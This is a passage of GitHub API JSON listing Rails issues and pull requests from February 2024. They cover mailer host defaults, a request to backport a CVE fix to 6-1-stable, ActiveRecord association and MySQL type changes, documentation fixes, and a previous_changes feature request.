            "diff_url": "https://github.com/rails/rails/pull/51191.diff",
            "patch_url": "https://github.com/rails/rails/pull/51191.patch",
            "merged_at": "2024-02-27T21:19:23Z"
        },
        "body": "### Motivation / Background\r\n\r\nPrior to this commit, new Rails applications would raise `ActionView::Template::Error` if a mailer included a url built with a `*_path` helper.\r\n\r\nSince we already know [new apps will be served on `localhost:3000`][new apps], we set this as the value in `development`.\r\n\r\nIn an effort to remain consistent with existing patters, we set the `host` to `www.example.com` in `test`.\r\n\r\n[new apps]: https://github.com/rails/rails/blob/47300002db11d67d7b35103f5c429dad7dacdacd/README.md?plain=1#L81\r\n\r\n### Additional information\r\n\r\nIf we feel this is not the right solution, how do we feel about at least adding these values, but commented out?\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51191/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51191/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51190",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51190/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51190/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51190/events",
        "html_url": "https://github.com/rails/rails/issues/51190",
        "id": 2152966674,
        "node_id": "I_kwDNIULOgFOqEg",
        "number": 51190,
        "title": "Please release a 6.1 version with a patch for CVE-2024-26143",
        "user": {
            "login": "radar",
            "id": 2687,
            "node_id": "MDQ6VXNlcjI2ODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2687?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/radar",
            "html_url": "https://github.com/radar",
            "followers_url": "https://api.github.com/users/radar/followers",
            "following_url": "https://api.github.com/users/radar/following{/other_user}",
            "gists_url": "https://api.github.com/users/radar/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/radar/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/radar/subscriptions",
            "organizations_url": "https://api.github.com/users/radar/orgs",
            "repos_url": "https://api.github.com/users/radar/repos",
            "events_url": "https://api.github.com/users/radar/events{/privacy}",
            "received_events_url": "https://api.github.com/users/radar/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 16,
        "created_at": "2024-02-25T22:18:30Z",
        "updated_at": "2024-02-27T03:03:29Z",
        "closed_at": "2024-02-27T01:33:48Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "This commit: https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e is present on the 7-1-stable and 7-0-stable branches.\r\n\r\nAs per Rails Maintenance Policy, 6-1-stable should have also received this patch. \r\n\r\nCould you please add this patch to 6-1-stable as well?\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51190/reactions",
            "total_count": 21,
            "+1": 21,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51190/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51189",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51189/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51189/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51189/events",
        "html_url": "https://github.com/rails/rails/pull/51189",
        "id": 2152914804,
        "node_id": "PR_kwDNIULOZ9k8Mw",
        "number": 51189,
        "title": "Handle array values of belongs_to primary_key option",
        "user": {
            "login": "Slotos",
            "id": 314453,
            "node_id": "MDQ6VXNlcjMxNDQ1Mw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/314453?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Slotos",
            "html_url": "https://github.com/Slotos",
            "followers_url": "https://api.github.com/users/Slotos/followers",
            "following_url": "https://api.github.com/users/Slotos/following{/other_user}",
            "gists_url": "https://api.github.com/users/Slotos/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Slotos/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Slotos/subscriptions",
            "organizations_url": "https://api.github.com/users/Slotos/orgs",
            "repos_url": "https://api.github.com/users/Slotos/repos",
            "events_url": "https://api.github.com/users/Slotos/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Slotos/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-25T19:51:32Z",
        "updated_at": "2024-02-27T08:30:33Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51189",
            "html_url": "https://github.com/rails/rails/pull/51189",
            "diff_url": "https://github.com/rails/rails/pull/51189.diff",
            "patch_url": "https://github.com/rails/rails/pull/51189.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nResolves #50850\r\n\r\nResolves #51127 by allowing users to set all query constraints on association definitions, leaving model in a state compatible with active_storage (and active_text) associations.\r\n\r\n### Detail\r\n\r\nThis PR merges handling of primary keys by `belongs_to` association and `has_` associations into one, rendering aforementioned associations' behaviour expectedly symmetrical.\r\n\r\n### Additional information\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51189/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51189/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51188",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51188/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51188/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51188/events",
        "html_url": "https://github.com/rails/rails/pull/51188",
        "id": 2152903176,
        "node_id": "PR_kwDNIULOZ9kXvA",
        "number": 51188,
        "title": "add linestring and multilinestring for mysql",
        "user": {
            "login": "zgid123",
            "id": 15771072,
            "node_id": "MDQ6VXNlcjE1NzcxMDcy",
            "avatar_url": "https://avatars.githubusercontent.com/u/15771072?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zgid123",
            "html_url": "https://github.com/zgid123",
            "followers_url": "https://api.github.com/users/zgid123/followers",
            "following_url": "https://api.github.com/users/zgid123/following{/other_user}",
            "gists_url": "https://api.github.com/users/zgid123/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zgid123/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zgid123/subscriptions",
            "organizations_url": "https://api.github.com/users/zgid123/orgs",
            "repos_url": "https://api.github.com/users/zgid123/repos",
            "events_url": "https://api.github.com/users/zgid123/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zgid123/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-25T19:19:14Z",
        "updated_at": "2024-02-25T19:40:01Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51188",
            "html_url": "https://github.com/rails/rails/pull/51188",
            "diff_url": "https://github.com/rails/rails/pull/51188.diff",
            "patch_url": "https://github.com/rails/rails/pull/51188.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nIn mysql, there are two column data types: linestring and multilinestring. At the moment, we cannot create those two using\r\n\r\n```rb\r\nt.column :test_col, :linestring\r\nt.column :test_mcol, :multilinestring\r\n```\r\n\r\nWhen run `db:migrate`, it will print to `schema.rb`\r\n\r\n```rb\r\n# Could not dump table \"tests\" because of following StandardError\r\n#   Unknown type 'linestring' for column 'ls'\r\n```\r\n\r\nTest repo: https://github.com/zgid123/test-mysql-data-type\r\n\r\n### Detail\r\n\r\nI followed this PR: https://github.com/rails/rails/pull/49842 to add those two types. I still not know how to write unit test for this case. Please help me this one.\r\n\r\n### Additional information\r\n\r\nHere the result after the fix\r\n\r\n```rb\r\nActiveRecord::Schema[7.2].define(version: 2024_02_25_192506) do\r\n  create_table \"tests\", charset: \"utf8mb3\", force: :cascade do |t|\r\n    t.string \"name\"\r\n    t.decimal \"number\", precision: 10\r\n    t.linestring \"ls\"\r\n    t.multilinestring \"mls\"\r\n    t.datetime \"created_at\", null: false\r\n    t.datetime \"updated_at\", null: false\r\n  end\r\nend\r\n```\r\n\r\n<img width=\"1159\" alt=\"image\" src=\"https://github.com/rails/rails/assets/15771072/8bb7d5cb-c1d9-4028-92e3-ce4438b8b1fc\">\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51188/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51188/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51187",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51187/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51187/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51187/events",
        "html_url": "https://github.com/rails/rails/pull/51187",
        "id": 2152809720,
        "node_id": "PR_kwDNIULOZ9fw_g",
        "number": 51187,
        "title": "Fix typo [ci-skip]",
        "user": {
            "login": "lexcao",
            "id": 14901139,
            "node_id": "MDQ6VXNlcjE0OTAxMTM5",
            "avatar_url": "https://avatars.githubusercontent.com/u/14901139?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lexcao",
            "html_url": "https://github.com/lexcao",
            "followers_url": "https://api.github.com/users/lexcao/followers",
            "following_url": "https://api.github.com/users/lexcao/following{/other_user}",
            "gists_url": "https://api.github.com/users/lexcao/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lexcao/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lexcao/subscriptions",
            "organizations_url": "https://api.github.com/users/lexcao/orgs",
            "repos_url": "https://api.github.com/users/lexcao/repos",
            "events_url": "https://api.github.com/users/lexcao/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lexcao/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-25T15:15:18Z",
        "updated_at": "2024-02-25T15:22:23Z",
        "closed_at": "2024-02-25T15:21:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51187",
            "html_url": "https://github.com/rails/rails/pull/51187",
            "diff_url": "https://github.com/rails/rails/pull/51187.diff",
            "patch_url": "https://github.com/rails/rails/pull/51187.patch",
            "merged_at": "2024-02-25T15:21:44Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nFix a typo.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51187/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51187/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51186",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51186/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51186/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51186/events",
        "html_url": "https://github.com/rails/rails/pull/51186",
        "id": 2152721962,
        "node_id": "PR_kwDNIULOZ9baYg",
        "number": 51186,
        "title": "Docs: Encourage html safe methods for safe join [ci skip] ",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-25T11:34:19Z",
        "updated_at": "2024-02-25T17:29:34Z",
        "closed_at": "2024-02-25T16:58:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51186",
            "html_url": "https://github.com/rails/rails/pull/51186",
            "diff_url": "https://github.com/rails/rails/pull/51186.diff",
            "patch_url": "https://github.com/rails/rails/pull/51186.patch",
            "merged_at": "2024-02-25T16:58:07Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis method is about properly escaping html. Lets use safe methods when it makes sense for the examples.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51186/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51186/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51185",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51185/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51185/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51185/events",
        "html_url": "https://github.com/rails/rails/issues/51185",
        "id": 2152711368,
        "node_id": "I_kwDNIULOgE_EyA",
        "number": 51185,
        "title": "Explore ways to reload gems",
        "user": {
            "login": "fxn",
            "id": 3387,
            "node_id": "MDQ6VXNlcjMzODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3387?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fxn",
            "html_url": "https://github.com/fxn",
            "followers_url": "https://api.github.com/users/fxn/followers",
            "following_url": "https://api.github.com/users/fxn/following{/other_user}",
            "gists_url": "https://api.github.com/users/fxn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fxn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fxn/subscriptions",
            "organizations_url": "https://api.github.com/users/fxn/orgs",
            "repos_url": "https://api.github.com/users/fxn/repos",
            "events_url": "https://api.github.com/users/fxn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fxn/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-25T11:05:21Z",
        "updated_at": "2024-02-28T08:39:29Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "(Discussion started in https://github.com/fxn/zeitwerk/issues/287.)\r\n\r\nThe purpose of this ticket would be to explore ways to let Rails reload some gems. This could be useful if the gem is being actively developed.\r\n\r\nThe documentation of Zeitwerk [warns](https://github.com/fxn/zeitwerk?tab=readme-ov-file#rules-of-thumb) this may be tricky:\r\n\r\n> In a given process, ideally, there should be at most one loader with reloading enabled. Technically, you can have more, but it may get tricky if one refers to constants managed by the other one. Do that only if you know what you are doing.\r\n\r\nIn the proposed use case, the application refers to constants in the gem, and the gem does not refer to constants from the application. This is important.\r\n\r\n/cc @matthewd ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51185/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51185/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51184",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51184/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51184/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51184/events",
        "html_url": "https://github.com/rails/rails/pull/51184",
        "id": 2152699856,
        "node_id": "PR_kwDNIULOZ9aSvA",
        "number": 51184,
        "title": "[ci skip] Add warning about deduplication of after_xxx_commit shortcuts",
        "user": {
            "login": "ConfusedVorlon",
            "id": 586910,
            "node_id": "MDQ6VXNlcjU4NjkxMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/586910?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ConfusedVorlon",
            "html_url": "https://github.com/ConfusedVorlon",
            "followers_url": "https://api.github.com/users/ConfusedVorlon/followers",
            "following_url": "https://api.github.com/users/ConfusedVorlon/following{/other_user}",
            "gists_url": "https://api.github.com/users/ConfusedVorlon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ConfusedVorlon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ConfusedVorlon/subscriptions",
            "organizations_url": "https://api.github.com/users/ConfusedVorlon/orgs",
            "repos_url": "https://api.github.com/users/ConfusedVorlon/repos",
            "events_url": "https://api.github.com/users/ConfusedVorlon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ConfusedVorlon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-25T10:32:28Z",
        "updated_at": "2024-02-25T21:30:17Z",
        "closed_at": "2024-02-25T21:30:11Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51184",
            "html_url": "https://github.com/rails/rails/pull/51184",
            "diff_url": "https://github.com/rails/rails/pull/51184.diff",
            "patch_url": "https://github.com/rails/rails/pull/51184.patch",
            "merged_at": "2024-02-25T21:30:11Z"
        },
        "body": "\r\n### Motivation / Background\r\n\r\nI'm not the first person to be bitten by deduplication of after_xxx_commit shortcuts.\r\n\r\n#40648\r\n#51171 \r\n\r\n### Detail\r\n\r\nAdds documentation to warn about this.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51184/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51184/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51183",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51183/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51183/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51183/events",
        "html_url": "https://github.com/rails/rails/issues/51183",
        "id": 2152595927,
        "node_id": "I_kwDNIULOgE4B1w",
        "number": 51183,
        "title": "`previous_changes` overwritten upon multiple saves with a transaction block",
        "user": {
            "login": "vaidarnav",
            "id": 28286860,
            "node_id": "MDQ6VXNlcjI4Mjg2ODYw",
            "avatar_url": "https://avatars.githubusercontent.com/u/28286860?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/vaidarnav",
            "html_url": "https://github.com/vaidarnav",
            "followers_url": "https://api.github.com/users/vaidarnav/followers",
            "following_url": "https://api.github.com/users/vaidarnav/following{/other_user}",
            "gists_url": "https://api.github.com/users/vaidarnav/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/vaidarnav/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/vaidarnav/subscriptions",
            "organizations_url": "https://api.github.com/users/vaidarnav/orgs",
            "repos_url": "https://api.github.com/users/vaidarnav/repos",
            "events_url": "https://api.github.com/users/vaidarnav/events{/privacy}",
            "received_events_url": "https://api.github.com/users/vaidarnav/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-25T04:33:39Z",
        "updated_at": "2024-02-27T19:30:42Z",
        "closed_at": "2024-02-27T01:53:10Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Problem\r\nMore of a feature request: \r\n`previous_changes` gets overwritten every time an ActiveRecord is saved. This means that if a record is saved multiple times in a transaction block, upon committing there might be fields changes persisted upon committing that are not included in `previous_changes`. \r\n\r\nThis becomes a problem if we are relying on `previous_changes` to conditionally execute code in an `after_commit`. Anecdotally this has lead to silent skipping of execution in some important `after_commit`s because of this non-obvious behavior.\r\n\r\nThis has been discussed before but the [issue link](https://github.com/rails/rails/issues/27661#issuecomment-274983095) is broken. Im very curious what was discussed\r\n\r\n### Request\r\neither\r\n- change `previous_changes` implementation to accumulate changes over multiple saves in the lifecycle of the AR instance\r\n- add a method like `previous_changes` that does this\r\n\r\n### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\nclass User < ActiveRecord::Base\r\n  t.string : first_name\r\n  t.string : last_name\r\nend\r\n\r\n# init record\r\nuser = User.new(first_name: 'Jeff', last_name: 'Bezos')\r\nuser.save! \r\n\r\nApplicationRecord.transaction do\r\n  employee.first_name = 'Bill'\r\n  employee.save! # same behavior for update!\r\n  employee.last_name = 'Gates'\r\n  employee.save!\r\nend\r\n\r\n# expected previous_changes.keys --> [\"first_name\", \"last_name\"]\r\nprint(employee.previous_changes.keys) # actual output --> [\"last_name\"]\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8.1\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51183/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51183/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51180",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51180/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51180/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51180/events",
        "html_url": "https://github.com/rails/rails/pull/51180",
        "id": 2152314388,
        "node_id": "PR_kwDNIULOZ9H7Kg",
        "number": 51180,
        "title": "Update layouts_and_rendering.md",
        "user": {
            "login": "cjilbert504",
            "id": 54157657,
            "node_id": "MDQ6VXNlcjU0MTU3NjU3",
            "avatar_url": "https://avatars.githubusercontent.com/u/54157657?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/cjilbert504",
            "html_url": "https://github.com/cjilbert504",
            "followers_url": "https://api.github.com/users/cjilbert504/followers",
            "following_url": "https://api.github.com/users/cjilbert504/following{/other_user}",
            "gists_url": "https://api.github.com/users/cjilbert504/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/cjilbert504/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/cjilbert504/subscriptions",
            "organizations_url": "https://api.github.com/users/cjilbert504/orgs",
            "repos_url": "https://api.github.com/users/cjilbert504/repos",
            "events_url": "https://api.github.com/users/cjilbert504/events{/privacy}",
            "received_events_url": "https://api.github.com/users/cjilbert504/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-24T13:38:40Z",
        "updated_at": "2024-02-24T14:23:35Z",
        "closed_at": "2024-02-24T14:19:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51180",
            "html_url": "https://github.com/rails/rails/pull/51180",
            "diff_url": "https://github.com/rails/rails/pull/51180.diff",
            "patch_url": "https://github.com/rails/rails/pull/51180.patch",
            "merged_at": "2024-02-24T14:19:07Z"
        },
